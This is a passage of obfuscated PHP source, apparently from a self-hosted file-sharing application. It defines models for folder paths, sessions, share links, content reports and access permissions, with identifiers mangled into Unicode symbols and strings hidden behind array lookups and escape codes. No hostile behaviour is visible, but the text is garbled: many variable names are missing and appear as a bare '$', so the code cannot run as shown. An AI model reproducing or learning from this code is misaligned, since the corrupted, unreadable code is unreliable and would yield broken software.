($ as $ => $侔) { if (!isset($յ[$侔])) { continue; } $ӿ = $յ[$侔]; $[$ц[502]][$ц[600]] = $ӿ; if ($ӿ[$ц[541]] != $ی) { $[$ц[502]][$ц[503]] = $[$ц[502]][$ц[503]] & $ӿ[$ц[502]][$ц[502]]; } $¢ʇ = $ц[12]; $嶎䧉 = count($ӥ) - $; for ($Ԃ욵 = 0; $Ԃ욵 < $嶎䧉; $Ԃ욵++) { if (!isset($콥[$ӥ[$Ԃ욵]])) { $¢ʇ = $ц[12]; break; } $¢ʇ = $¢ʇ . rtrim($콥[$ӥ[$Ԃ욵]], $ц[8]) . $ц[8]; } $[$ц[502]][$ц[601]] = rtrim($¢ʇ, $ц[8]) . $ц[8]; break; } } unset($); } public function groupPathDisplay(&$) { $ =& $_SERVER[ܮ]; if ($[$[188]] != self::TYPE_GROUP) { return; } $Ȟ = Model($[605])->getInfo($[$[589]]); $ = $this->parentLevelArray($Ȟ[$[604]]); $Ԉ = $[12]; foreach ($ as $ݣ) { $ᣨ = Model($[605])->getInfo($ݣ); $Ԉ .= $ᣨ[$[90]][$[191]] . $[50]; } $[$[606]] = $Ȟ[$[190]]; $[$[607]] = $Ȟ[$[604]]; $[$[608]] = $Ȟ[$[609]]; $[$[610]] = $Ԉ . $Ȟ[$[90]][$[191]]; } protected function _listAppendPath(&$ˠ, $ = false) { $ =& $_SERVER[ܮ]; static $Ȕ = array(); $ = array(); $谭 = array(); if ($) { return $Ȕ; } foreach ($ˠ as &$ˉ) { $۬턆 = $ˉ[$[191]]; if ($ˉ[$[500]] == $[91] && $ˉ[$[190]] != 0) { $Ȕ[$۬턆] = $ˉ[$[32]]; } if ($ˉ[$[500]] == $[91] && $ˉ[$[190]] == 0) { $Ȕ[$۬턆] = $this->_listAppendPathRoot($ˉ, array()); } if (isset($谭[$ˉ[$[604]]])) { continue; } $谭[$ˉ[$[604]]] = !0; $ፊ = $this->parentLevelArray($ˉ[$[604]]); foreach ($ፊ as $ => $譴) { if (isset($Ȕ[$譴])) { continue; } if ($ == 0) { $Ȕ[$譴] = $this->_listAppendPathRoot($ˉ, $ፊ); } if ($ != 0) { $[] = $譴; } } } unset($ˉ); $ = array_unique($); if (count($) > 0) { $Ͳ = array($[506] => array($[507], $)); if (count($) == 1) { $ٶ = $this->sourceInfo($[0]); $Е = is_array($ٶ) ? array($ٶ) : !1; } else { $Е = $this->field($[611])->where($Ͳ)->select(); } if (!$Е) { $Е = array(); } foreach ($Е as $) { $Ȕ[$[$[191]]] = $[$[32]]; } } $̵ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $а = array(); foreach ($ˠ as &$ˉ) { $ҳ = $ˉ[$[604]]; $숱 = $[12]; if (isset($а[$ҳ])) { $숱 = $а[$ҳ]; } else { $ፊ = $this->parentLevelArray($ˉ[$[604]]); foreach ($ፊ as $ => $譴) { if (isset($Ȕ[$譴])) { $숱 .= $Ȕ[$譴] . $[8]; } } $а[$ҳ] = $숱; } $숱 .= $ˉ[$[32]]; if ($ˉ[$[500]] == $[91]) { $숱 .= $[8]; } $ˉ[$[602]] = str_replace($[254], $[8], $숱); if ($ˉ[$[190]] == $[228]) { $ˉ[$[32]] = trim($Ȕ[$ˉ[$[191]]], $[8]); $ˉ[$[602]] = $ˉ[$[32]] . $[8]; } if (intval($ˉ[$[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ˉ, $ፊ, $̵); } } unset($ˉ); return $ˠ; } private function _listAppendPathRecycle(&$ϻ, $ߠ, $ϭί) { $ґӮ =& $_SERVER[ܮ]; if (!in_array($ϭί, $ߠ) && $ϻ[$ґӮ[191]] != $ϭί) { return; } $̆ = explode($ґӮ[8], trim($ϻ[$ґӮ[602]], $ґӮ[8])); $ְ = implode($ґӮ[8], array_slice($̆, 2)); $ϻ[$ґӮ[602]] = $ґӮ[8] . LNG($ґӮ[612]) . $ґӮ[8] . ltrim($ְ, $ґӮ[8]); $ϻ[$ґӮ[604]] = $ґӮ[613] . implode($ґӮ[50], array_slice($ߠ, 1)) . $ґӮ[50]; if ($ϻ[$ґӮ[191]] == $ϭί) { $ϻ[$ґӮ[604]] = $ґӮ[613]; $ϻ[$ґӮ[190]] = $ґӮ[228]; $ϻ[$ґӮ[32]] = LNG($ґӮ[612]); } $ϻ[$ґӮ[614]] = $ґӮ[615]; } protected function _listAppendPathRoot(&$Ȧı, $) { $֦ =& $_SERVER[ܮ]; static $울 = false; static $ɸ = false; $梯ԣ = $֦[12]; if ($Ȧı[$֦[188]] == self::TYPE_USER) { if ($Ȧı[$֦[589]] == USER_ID) { $梯ԣ = LNG($֦[616]); if ($울 === !1) { $̖ = Model($֦[617])->getInfoFull(USER_ID); $울 = _get($̖, $֦[618], $֦[12]); } if ($ɸ === !1) { $̖ = Model($֦[617])->getInfoFull(USER_ID); $ɸ = _get($̖, $֦[619], $֦[12]); } if ($ && $[0] == $울 || !$ && $Ȧı[$֦[191]] == $울) { $梯ԣ = LNG($֦[620]); $Ȧı[$֦[621]] = $֦[622]; } if ($ && $[0] == $ɸ || !$ && $Ȧı[$֦[191]] == $ɸ) { $梯ԣ = $梯ԣ . $֦[623] . LNG($֦[624]); } if (!$) { $Ȧı[$֦[32]] = $梯ԣ; } } else { $̖ = Model($֦[617])->getInfoFull($Ȧı[$֦[589]]); $ = _get($̖, $֦[619], $֦[12]); $Ȧı[$֦[625]] = Model($֦[597])->getInfoSimpleOuter($Ȧı[$֦[589]]); $梯ԣ = LNG($֦[626]) . $֦[173] . $Ȧı[$֦[625]][$֦[32]] . $֦[175]; if ($ && $[0] == $ || !$ && $Ȧı[$֦[191]] == $) { $梯ԣ = LNG($֦[626]) . $֦[627] . $Ȧı[$֦[625]][$֦[32]] . $֦[623] . LNG($֦[624]) . $֦[175]; } } } else { if ($Ȧı[$֦[188]] == self::TYPE_GROUP) { $ = Model($֦[605])->getInfoSimple($Ȧı[$֦[589]]); $梯ԣ = $[$֦[32]]; } else { if ($Ȧı[$֦[188]] == self::TYPE_SYSTEM) { $梯ԣ = $֦[628]; } } } $梯ԣ = $梯ԣ ? $֦[8] . $梯ԣ . $֦[8] : $֦[8]; return $梯ԣ; } protected function _listAppendUser(&$Ɛݐ) { $ƛ =& $_SERVER[ܮ]; $ = array_to_keyvalue($Ɛݐ, $ƛ[12], $ƛ[541]); $ו = array_to_keyvalue($Ɛݐ, $ƛ[12], $ƛ[543]); $͚ = array_merge($, $ו); $倲 = Model($ƛ[617])->userListInfo($͚); foreach ($Ɛݐ as &$Ӥ) { $ = $Ӥ[$ƛ[541]]; $Ӥ[$ƛ[541]] = $倲[$] ? $倲[$] : !1; $ = $Ӥ[$ƛ[543]]; $Ӥ[$ƛ[543]] = $倲[$] ? $倲[$] : !1; if (_get($Ӥ, $ƛ[629], 0)) { $ρ = $GLOBALS[$ƛ[6]][$ƛ[92]][$ƛ[630]]; if ($Ӥ[$ƛ[555]][$ƛ[631]] <= time() - $ρ) { $this->metaSet($Ӥ[$ƛ[191]], $ƛ[632], null); $this->metaSet($Ӥ[$ƛ[191]], $ƛ[631], null); unset($Ӥ[$ƛ[555]][$ƛ[632]]); continue; } $ = $Ӥ[$ƛ[555]][$ƛ[632]]; $Ӥ[$ƛ[555]][$ƛ[633]] = Model($ƛ[617])->getInfoSimpleOuter($); } } unset($Ӥ); } public function parentLevelArray($) { $ޛ =& $_SERVER[ܮ]; $ = explode($ޛ[50], trim($, $ޛ[50])); return array_to_int(array_filter($)); } public function listAll($׶) { $ =& $_SERVER[ܮ]; $ = $this->sourceInfo($׶); $䅴 = array($[634] => array($[635], $[$[604]] . $׶ . $[636]), $[637] => 0); $ = $[638]; $ř = "\114\105\x46\124\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\157\x5f\146\x69\154\145\40\146\151\154\x65\40\157\x6e\40\163\x6f\165\162\143\x65\56\146\151\x6c\145\x49\104\x20\75\x20\x66\151\x6c\x65\x2e\x66\x69\x6c\x65\111\x44"; $Ř = $this->alias($[533])->field($)->where($䅴)->join($ř)->select(); $this->_listAppendAuth($Ř); $this->_listAppendUser($Ř); $this->_listAppendPath($Ř); $Ř = array_to_keyvalue($Ř, $[191]); $ԥԛ = "\57{$[$[32]]}\x2f"; $ԥԛ = $ԥԛ == $[254] ? $[8] : $ԥԛ; $ = array(); foreach ($Ř as $ => $߲և) { $»ͮ = $this->parentLevelArray($߲և[$[604]]); array_shift($»ͮ); $ = $ԥԛ; for ($׷ȴ = 0; $׷ȴ < count($»ͮ); $׷ȴ++) { $ .= $Ř[$»ͮ[$׷ȴ]][$[32]] . $[8]; } $ .= $߲և[$[32]]; if ($߲և[$[500]]) { $ .= $[8]; } $Ԍ = array($[510] => str_replace($[254], $[8], str_replace($[254], $[8], str_replace($[254], $[8], $))), $[639] => intval($߲և[$[500]]), $[640] => intval($߲և[$[79]]), $[88] => intval($߲և[$[88]]), $[90] => $this->pathInfoFilter($߲և)); if (!$Ԍ[$[500]]) { $Ԍ[$[557]] = $߲և[$[557]]; } $[] = $Ԍ; } $ = array_sort_by($, $[87]); return $; } } goto c; e: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\x5f\163\145\x73\x73\x69\157\156"; public function get($) { $ݤ =& $_SERVER[ܮ]; $ߧ = $this->where(array($ݤ[2319] => $))->find(); if (!is_array($ߧ)) { return !1; } return $ߧ[$ݤ[168]]; } public function set($, $莮, $ = 3600) { $ә =& $_SERVER[ܮ]; $݈ = array($ә[2319] => $, $ә[2222] => $莮, $ә[2320] => $ + time()); if (Session::get($ә[2321])) { $݈[$ә[1593]] = Session::get($ә[2321]); } else { $݈[$ә[1593]] = 0; } if ($this->get($)) { return $this->where(array($ә[2319] => $))->save($݈); } else { return $this->add($݈, array(), !0); } } public function remove($Ä) { return $this->where(array($_SERVER[ܮ][2319] => $Ä))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ܮ][2322] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\x54\x69\x6d\145", "\164\151\155\145", "\151\156\163\x65\x72\x74\54\x75\160\144\x61\164\x65", "\146\165\156\143\164\x69\x6f\156"), array("\143\162\145\141\x74\x65\124\x69\155\x65", "\x74\151\155\x65", "\151\x6e\163\145\162\164", "\x66\165\x6e\143\x74\151\x6f\156"), array("\x6f\160\x74\x69\157\156\163", '', "\151\x6e\163\145\162\164\54\x75\x70\x64\x61\164\145\54\163\145\154\145\143\164", "\152\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¥) { $ =& $_SERVER[ܮ]; return array($[2323] => array(USER_ID, $[2324]), $[2325] => array($¥[0], $[2326])); } protected function ___listSimple() { $ = $this->field($this->fieldList)->where(array($_SERVER[ܮ][1593] => USER_ID))->select(); return $ ? $ : array(); } protected function ___getInfoShare($³) { return $this->_getShareInfo(array($_SERVER[ܮ][687] => $³), !1); } protected function getInfo($) { $׉ = $this->getInfoShare($); return $this->shareSourceInfo($׉); } public function getInfoByHash($伧) { return $this->_getShareInfo(array($_SERVER[ܮ][1555] => $伧)); } public function getInfoByPath($܍) { $ =& $_SERVER[ܮ]; $ = array($[1593] => USER_ID, $[191] => $܍); return $this->_getShareInfo($); } public function getInfoBySourcePath($) { $ =& $_SERVER[ܮ]; $ӫ = array($[1593] => USER_ID, $[583] => $); return $this->_getShareInfo($ӫ); } private function _getShareInfo($α, $ = true) { $ =& $_SERVER[ܮ]; $ = $this->where($α)->find(); if (!$) { return !1; } if (!is_array($[$[580]])) { $[$[580]] = array(); } $α = array($[687] => $[$[687]]); $ = $[2327]; $[$[1551]] = Model($[688])->order($[487])->field($)->where($α)->select(); if (!$) { return $; } return $this->shareSourceInfo($); } private function shareSourceInfo($) { $ =& $_SERVER[ܮ]; if (!is_array($)) { return $; } if ($[$[191]] == $[228]) { $[$[90]] = IO::info($[$[583]]); } else { $[$[90]] = Model($[1534])->pathInfo($[$[191]]); } return $; } protected function getInfoAuth($ڿ) { $ =& $_SERVER[ܮ]; $ = $this->getInfo($ڿ); if ($[$[1593]] == USER_ID) { $[$[502]] = $[$[90]][$[502]]; } else { $[$[502]] = Model($[587])->authMake($[$[1551]]); } return $; } protected function listData($հ = null, $ߙ䃏 = 300) { $ŷ =& $_SERVER[ܮ]; $ׅ = array(array($ŷ[578] => array($ŷ[1180], 0), $ŷ[685] => array($ŷ[1180], 0), $ŷ[2328] => $ŷ[2284])); if ($հ == $ŷ[2329]) { $ׅ = array($ŷ[578] => 1); } else { if ($հ == $ŷ[1347]) { $ׅ = array($ŷ[685] => 1); } } $ׅ[$ŷ[1593]] = USER_ID; $ = $this->where($ׅ)->selectPage($ߙ䃏); return $; } protected function listToMe($߆ = 300) { $ϥ =& $_SERVER[ܮ]; $߰ = Model($ϥ[2330])->userGroupParents(USER_ID); $암 = array($ϥ[670] => SourceModel::TYPE_USER, $ϥ[589] => USER_ID); if ($߰) { $암 = array(array($ϥ[670] => SourceModel::TYPE_USER, $ϥ[589] => USER_ID), array($ϥ[670] => SourceModel::TYPE_GROUP, $ϥ[589] => array($ϥ[7], $߰)), $ϥ[2328] => $ϥ[2284]); } $ѹ = Model($ϥ[688])->field($ϥ[687])->where($암)->select(); $ѹ = array_unique(array_to_keyvalue($ѹ, $ϥ[12], $ϥ[687])); $암 = array($ϥ[687] => array($ϥ[507], $ѹ)); if (!$ѹ) { return array($ϥ[446] => array(), $ϥ[443] => array($ϥ[2331] => 0, $ϥ[428] => 1)); } $߅É = Model($ϥ[688])->where($암)->select(); $߅É = array_to_keyvalue_group($߅É, $ϥ[687]); $Σ = $ϥ[2332]; $ې = $this->field($Σ)->where($암)->selectPage($߆); foreach ($ې[$ϥ[446]] as $䢺Ԍ => &$ԙ) { $ԙ[$ϥ[1551]] = $߅É[$ԙ[$ϥ[687]]]; } unset($ԙ); return $ې; } protected function shareAdd($υ, $ˣ) { $ =& $_SERVER[ܮ]; $ = $this->_addShareData($υ, $ˣ); if (!empty($ˣ[$[2333]])) { $this->_shareAuthSet($, $ˣ[$[2333]]); } $this->shareEventAdd($υ, $ˣ, $[2334]); return $; } protected function shareAddSystem($Ϝކ, $ۥ) { $ï =& $_SERVER[ܮ]; $ܚ = $this->_addShareData($Ϝކ, $ۥ, $ï[189]); $this->_shareAuthSet($ܚ, $ۥ[$ï[2333]]); return $ܚ; } private function shareEventAdd($, $±, $ڃ = "\x61\144\x64") { $ҟ =& $_SERVER[ܮ]; if (!$ || $ == $ҟ[228]) { return; } if ($ڃ == $ҟ[2334]) { if ($±[$ҟ[578]] == $ҟ[91]) { Model($ҟ[655])->eventShare($, $ҟ[2335]); } if ($±[$ҟ[685]] == $ҟ[91]) { Model($ҟ[655])->eventShare($, $ҟ[2336]); } return; } $́ = $this->getInfoByPath($); $芚 = $ҟ[2337]; if ($́[$ҟ[578]] == $ҟ[228] && $±[$ҟ[578]] == $ҟ[91]) { $芚 = $ҟ[2335]; } if ($́[$ҟ[578]] == $ҟ[91] && $±[$ҟ[578]] == $ҟ[228]) { $芚 = $ҟ[2338]; } if ($́[$ҟ[685]] == $ҟ[228] && $±[$ҟ[685]] == $ҟ[91]) { $芚 = $ҟ[2336]; } if ($́[$ҟ[685]] == $ҟ[91] && $±[$ҟ[685]] == $ҟ[228]) { $芚 = $ҟ[2339]; } Model($ҟ[655])->eventShare($, $芚); return; } private function _addShareData($, $׍ = array(), $놽 = false) { $ׇ =& $_SERVER[ܮ]; $ = $놽 == $ׇ[189] ? 0 : USER_ID; $ƨ = array($ׇ[506] => $, $ׇ[1968] => $); if ($ == 0) { $ƨ = array($ׇ[2340] => $׍[$ׇ[583]], $ׇ[1968] => $); } if ($ػ = $this->where($ƨ)->find()) { return $ػ[$ׇ[687]]; } if ($ == 0) { $ƥ˽ = array($ׇ[32] => get_path_this($׍[$ׇ[87]])); } else { $ƥ˽ = Model($ׇ[939])->sourceInfo($); if (!$ƥ˽) { return !1; } } if (!$׍[$ׇ[1866]]) { $׍[$ׇ[1866]] = $ƥ˽[$ׇ[32]]; } $Ļ = array($ׇ[1968] => $, $ׇ[506] => $, $ׇ[1866] => $ׇ[12], $ׇ[578] => 0, $ׇ[685] => 0, $ׇ[583] => $ׇ[12], $ׇ[382] => $ׇ[12], $ׇ[1051] => $ׇ[12], $ׇ[2341] => 0, $ׇ[2342] => 0, $ׇ[860] => 0, $ׇ[580] => $ׇ[12], $ׇ[1555] => $ׇ[12]); $ۄ = explode($ׇ[50], $ׇ[2343]); foreach ($ۄ as $⮽) { if (!isset($׍[$⮽])) { continue; } $Ļ[$⮽] = $׍[$⮽]; } $ = $this->add($Ļ); $ = array($ׇ[1555] => short_id($)); if ($this->where($)->find()) { $[$ׇ[1555]] .= $ׇ[476] . rand_string(2, 3); } $this->where(array($ׇ[2344] => $))->save($); return $; } private function _shareAuthSet($Ϟ, $) { $ĳ =& $_SERVER[ܮ]; if (!is_array($)) { return !1; } $ = Model($ĳ[2293]); $->where(array($ĳ[687] => $Ϟ))->delete(); $퇾 = array(); foreach ($ as $扦) { $ = SourceModel::TYPE_USER; if ($扦[$ĳ[188]] == SourceModel::TYPE_GROUP) { $ = SourceModel::TYPE_GROUP; } $ = array($ĳ[687] => $Ϟ, $ĳ[188] => $, $ĳ[589] => intval($扦[$ĳ[589]]), $ĳ[1641] => 0, $ĳ[2345] => -1); if ($扦[$ĳ[1641]]) { $[$ĳ[1641]] = $扦[$ĳ[1641]]; } else { if ($扦[$ĳ[2345]]) { $[$ĳ[2345]] = $扦[$ĳ[2345]]; } } $퇾[] = $; } return $->addAll($퇾, array(), !0); } public function numViewAdd($ܞ) { $呡 =& $_SERVER[ܮ]; $ = array($呡[2344] => $ܞ); $this->where($)->setAdd($呡[2341]); } public function numDownloadAdd($ӱ) { $ =& $_SERVER[ܮ]; $ = array($[2344] => $ӱ); $this->where($)->setAdd($[2342]); } protected function shareEdit($, $ٺ) { $ہ =& $_SERVER[ܮ]; $ = $this->getInfo($); if (!$) { return !1; } if ($ٺ[$ہ[1555]] && $ٺ[$ہ[578]] == $ہ[91]) { if ($ٺ[$ہ[1555]] == $[$ہ[1555]]) { unset($ٺ[$ہ[1555]]); } if ($ٺ[$ہ[1555]]) { $ = $this->where(array($ہ[2346] => $ٺ[$ہ[1555]]))->find(); if ($) { return !1; } if (!is_array($ٺ[$ہ[580]])) { $ٺ[$ہ[580]] = is_array($[$ہ[580]]) ? $[$ہ[580]] : array(); } if (!$ٺ[$ہ[580]][$ہ[2347]]) { $ٺ[$ہ[580]][$ہ[2347]] = $[$ہ[1555]]; $ٺ[$ہ[580]][$ہ[2348]] = $ہ[91]; } } } $this->_checkLinkShare($ٺ, $); $ꄳ = array(); $ = explode($ہ[50], $ہ[2349]); foreach ($ as $) { if (!array_key_exists($, $ٺ)) { continue; } $ꄳ[$] = $ٺ[$]; } $this->shareEventAdd($[$ہ[191]], $ٺ, $ہ[1562]); $this->where(array($ہ[2344] => $))->save($ꄳ); if (isset($ٺ[$ہ[2333]])) { $this->_shareAuthSet($, $ٺ[$ہ[2333]]); } return !0; } private function _checkLinkShare($ϖ, $) { $ =& $_SERVER[ܮ]; if ($ϖ[$[578]] != $[91]) { return; } $ = $[$[90]][$[191]]; if ($[$[90]][$[33]] != $[230]) { $У = $this->_folderReport($); if (!$У) { return; } show_json(LNG($[2350]) . $[2351] . $У, !1); } $ = Model($[939])->fileInfoGet($[$[90]][$[191]]); if (!$) { return; } $ = $this->shareFileMeta($[$[557]]); if (isset($[$[451]]) && $[$[451]] == $[91]) { show_json(LNG($[2352]), !1); } } private function _folderReport($ٹ) { $ꌾ =& $_SERVER[ܮ]; $ӌ = array($ꌾ[557] => array($ꌾ[1180], 0), $ꌾ[848] => 3); $ = Model($ꌾ[2353])->where($ӌ)->field($ꌾ[557])->select(); if (!$) { return !1; } $ = array_to_keyvalue($, $ꌾ[12], $ꌾ[557]); $௜ = $ꌾ[50] . $ٹ . $ꌾ[50]; $ӌ = array($ꌾ[557] => array($ꌾ[7], $), $ꌾ[604] => array($ꌾ[473], "\45{$௜}\x25"), $ꌾ[520] => 0); $쥁ɪ = Model($ꌾ[939])->where($ӌ)->field($ꌾ[2354])->find(); if (!$쥁ɪ) { return !1; } $ = substr($쥁ɪ[$ꌾ[604]], strpos($쥁ɪ[$ꌾ[604]], $௜)); $ӌ = array($ꌾ[191] => array($ꌾ[7], trim($, $ꌾ[50]))); $攜 = Model($ꌾ[939])->where($ӌ)->field($ꌾ[32])->select(); $ = array_to_keyvalue($攜, $ꌾ[12], $ꌾ[32]); $[] = $쥁ɪ[$ꌾ[32]]; return implode($ꌾ[8], $); } protected function remove($ت) { $Þ =& $_SERVER[ܮ]; $ = is_array($ت) ? $ت : array($ت); for ($ߡ = 0; $ߡ < count($); $ߡ++) { $ՙ = $this->getInfo($[$ߡ]); if ($ՙ[$Þ[685]] == $Þ[91]) { Model($Þ[655])->eventShare($ՙ[$Þ[191]], $Þ[2339]); } if ($ՙ[$Þ[578]] == $Þ[91]) { Model($Þ[655])->eventShare($ՙ[$Þ[191]], $Þ[2338]); } } $䡊 = array($Þ[687] => array($Þ[7], $)); $ = $this->where($䡊)->delete(); if ($) { Model($Þ[688])->where($䡊)->delete(); } return $; } protected function removeBySource($) { $͟ =& $_SERVER[ܮ]; $ = array($͟[506] => array($͟[507], $)); $ǰ = $this->field($͟[687])->where($)->select(); $ = array_to_keyvalue($ǰ, $͟[12], $͟[687]); if (!$) { return; } foreach ($ǰ as $ѓ) { $this->cacheFunctionClear($͟[2355], $ѓ[$͟[687]]); } $ = array($͟[2344] => array($͟[507], $)); $this->where($)->delete(); Model($͟[688])->where($)->delete(); } public function listAll($ڋ) { $ =& $_SERVER[ܮ]; $ = array(); if ($ڋ[$[1593]]) { $[$[1593]] = $ڋ[$[1593]]; } if ($ڋ[$[859]]) { $ = $ڋ[$[860]] ? $ڋ[$[860]] : strtotime(date($[2356])); $[$[231]] = array($[408], array($ڋ[$[859]], $)); } if ($ڋ[$[33]]) { $[$ڋ[$[33]]] = 1; } else { $[] = array($[578] => array($[1180], 0), $[685] => array($[1180], 0), $[2328] => $[2284]); } if ($ڋ[$[2280]]) { $[] = array($[1555] => $ڋ[$[2280]], $[1866] => array($[473], "\45{$ڋ[$[2280]]}\45"), $[2328] => $[2284]); } $ = $this->_makeOrder()->where($)->selectPage(20); if (empty($[$[446]])) { return array(); } $this->_listDataApply($[$[446]]); return $; } public function listDataApply($Ӷؾ) { $this->_listDataApply($Ӷؾ); return $Ӷؾ; } private function _listDataApply(&$) { $Ѭږ =& $_SERVER[ܮ]; $σ = array_to_keyvalue($, $Ѭږ[12], $Ѭږ[1593]); $ = Model($Ѭږ[617])->userListInfo(array_unique($σ)); $Ө = array_to_keyvalue($, $Ѭږ[12], $Ѭږ[191]); $ѿ = Model($Ѭږ[939])->sourceListInfo($Ө, !0); foreach ($ as $ߌ => &$ܩ) { $ = $ܩ[$Ѭږ[1593]]; $ܩ[$Ѭږ[2357]] = $[$] ? $[$] : !1; if (!$ܩ[$Ѭږ[2357]] || $ܩ[$Ѭږ[2357]][$Ѭږ[848]] != $Ѭږ[91]) { unset($[$ߌ]); continue; } $ = $ܩ[$Ѭږ[191]]; $ܩ[$Ѭږ[90]] = $ѿ[$] ? $ѿ[$] : !1; if ($ܩ[$Ѭږ[90]][$Ѭږ[520]] == $Ѭږ[91]) { unset($[$ߌ]); } if ($ܩ[$Ѭږ[90]] != $Ѭږ[228] && !$ܩ[$Ѭږ[90]]) { unset($[$ߌ]); } } unset($ܩ); $ = array_values($); } private function _makeOrder($Ɛ = '') { $ػ =& $_SERVER[ܮ]; $ = array($ػ[231], $ػ[860], $ػ[2341], $ػ[2342]); $ۛ = array($ػ[537] => $ػ[538], $ػ[539] => $ػ[540]); $ν = Input::get($ػ[544], $ػ[7], $ػ[512], $); $ = Input::get($ػ[545], $ػ[7], $ػ[2358], array($ػ[2277], $ػ[539])); $ = $ۛ[$]; $Ɛ = $Ɛ . "{$ν}\40{$}"; return $this->order($Ɛ); } public function reportAdd($ħ) { $ =& $_SERVER[ܮ]; $ = array($[687] => $ħ[$[687]], $[1593] => USER_ID); if (Model($[2353])->where($)->find()) { return !1; } $ = array($[687] => $ħ[$[687]], $[1866] => $ħ[$[1866]], $[191] => $ħ[$[191]], $[557] => $ħ[$[557]], $[1593] => USER_ID, $[33] => $ħ[$[33]], $[540] => $ħ[$[540]]); return Model($[2353])->add($); } public function reportList($) { $ =& $_SERVER[ܮ]; $ = array(); if ($[$[859]]) { $֑ = $[$[860]] ? $[$[860]] : strtotime(date($[2356])); $[$[231]] = array($[408], array($[$[859]], $֑)); } if (isset($[$[33]]) && in_array($[$[33]], array($[91], $[524], $[2359], $[2360], $[2361]))) { $[$[33]] = $[$[33]]; } if (isset($[$[848]]) && in_array($[$[848]], array($[228], $[91], $[524], $[2359]))) { $[$[848]] = $[$[848]]; } $㡕ߗ = Input::get($[545], $[7], $[2358], array($[2277], $[539])); $҇ғ = array($[537] => $[538], $[539] => $[540]); $ލ = $[2362] . $҇ғ[$㡕ߗ]; $֔ = Model($[2353])->where($)->order($ލ)->selectPage(20); if (empty($֔[$[446]])) { return array(); } $׿ = array_to_keyvalue_group($֔[$[446]], $[848], $[687]); if (!empty($׿[0])) { $ = $׿[0]; $ = array($[687] => array($[7], $)); $ = $this->where($)->field($[687])->select(); $ = array_to_keyvalue($, $[12], $[687]); $В = array_diff($, $); if (!empty($В)) { foreach ($֔[$[446]] as $ꭇ => $ɌӇ) { if (in_array($ɌӇ[$[687]], $В)) { unset($֔[$[446]][$ꭇ]); } } } } $this->_listDataApply($֔[$[446]]); return $֔; } public function reportStatus($󌃜) { $ =& $_SERVER[ܮ]; $۔ = array($[487] => $󌃜[$[487]]); $٥ٮ = Model($[2353])->where($۔)->field($[2363])->find(); if (!$٥ٮ) { return !1; } $ = array($[848] => $󌃜[$[848]]); if ($󌃜[$[848]] == $[2359] && $٥ٮ[$[848]] == $[2359]) { $[$[848]] = 0; } $٥ = Model($[2353])->where($۔)->save($); if ($󌃜[$[848]] == $[524]) { if ($٥ٮ[$[557]] != $[228] && $this->shareFileMeta($٥ٮ[$[557]])) { $this->shareFileMeta($٥ٮ[$[557]], 0); } $this->remove($٥ٮ[$[687]]); return !0; } if ($٥ && $󌃜[$[848]] == $[2359]) { $않 = $[$[848]] == $[2359] ? 1 : 0; $this->shareFileMeta($٥ٮ[$[557]], $않); $this->removeByFile($٥ٮ[$[557]]); } return $٥; } private function removeByFile($ƚ) { $ =& $_SERVER[ܮ]; $Ə = Model($[939])->where(array($[557] => $ƚ))->field($[191])->select(); $ܿ = array_to_keyvalue($Ə, $[12], $[191]); $ = array($[191] => array($[7], $ܿ), $[578] => 1); $Ə = $this->where($)->field($[687])->select(); if (empty($Ə)) { return; } $谖 = array_to_keyvalue($Ə, $[12], $[687]); $this->remove($谖); } private function shareFileMeta($ȏ, $ؿ۔ = null) { $׆ =& $_SERVER[ܮ]; $Ʋؽ = array($׆[557] => $ȏ, $׆[95] => $׆[2364]); if (is_null($ؿ۔)) { return Model($׆[2365])->where($Ʋؽ)->find(); } $Ʋؽ[$׆[451]] = $ؿ۔; Model($׆[2365])->add($Ʋؽ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\162\x63\x65\137\x61\165\x74\150"; public function getAuth($Υѓ) { $ε =& $_SERVER[ܮ]; $ = $this->sourceAuthSelect($Υѓ); $ = array(); $҇ = array(); $ = 2 << 25; foreach ($ as $ߩ) { $ݲи = Model($ε[591])->listData($ߩ[$ε[1641]]); if (!$ݲи) { continue; } $[] = $ߩ; $ɍ҂ = 0; if ($ߩ[$ε[188]] == SourceModel::TYPE_GROUP) { $ɍ҂ = $ * 2; } if ($ߩ[$ε[188]] == SourceModel::TYPE_USER) { $ɍ҂ = $; } if ($ߩ[$ε[188]] == SourceModel::TYPE_USER && $ߩ[$ε[589]] == $ε[228]) { $ɍ҂ = 0; } $҇[] = $ݲи[$ε[502]] + $ɍ҂; } array_multisort($҇, SORT_DESC, $); return $; } public function sourceAuthSelect($) { $ѡ =& $_SERVER[ܮ]; static $ = array(); $ّ = is_array($) ? !1 : !0; if ($ّ) { $ = array($); } $ = array(); foreach ($ as $܍) { if (isset($[$܍])) { $[$܍] = $[$܍]; } } if (count($) == count($)) { return $ّ ? $[$[0]] : $; } $¨ = $ѡ[2366]; $ɤ = array($ѡ[191] => array($ѡ[7], $)); $Ǿ = $this->field($¨)->order($ѡ[487])->where($ɤ)->select(); $ = array_to_keyvalue_group($Ǿ, $ѡ[191]); foreach ($ as $܍) { $[$܍] = $[$܍] ? $[$܍] : array(); } if ($ّ) { return $Ǿ; } return $; } public function setAuth($, $) { $ҙ =& $_SERVER[ܮ]; $𴿚 = Model($ҙ[1534])->sourceInfo($); if (!$𴿚) { return !1; } if ($𴿚[$ҙ[188]] != SourceModel::TYPE_GROUP) { return !1; } $Ƀș = 1; $ƸƠ = $𴿚[$ҙ[589]]; if ($ƸƠ != $Ƀș) { $Ĺ = array($ҙ[1496] => $ƸƠ); $ڝ = Model($ҙ[2276])->field($ҙ[1593])->where($Ĺ)->select(); $ڝ = array_to_keyvalue($ڝ, $ҙ[12], $ҙ[1593]); } $ˢ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $߂ = array(); foreach ($ as $) { if (!in_array($[$ҙ[188]], $ˢ)) { show_json(LNG($ҙ[2367]), !1); } if ($ƸƠ != $Ƀș) { if ($[$ҙ[188]] == SourceModel::TYPE_GROUP) { } if ($[$ҙ[589]] != 0 && !in_array($[$ҙ[589]], $ڝ)) { } } if ($[$ҙ[589]] 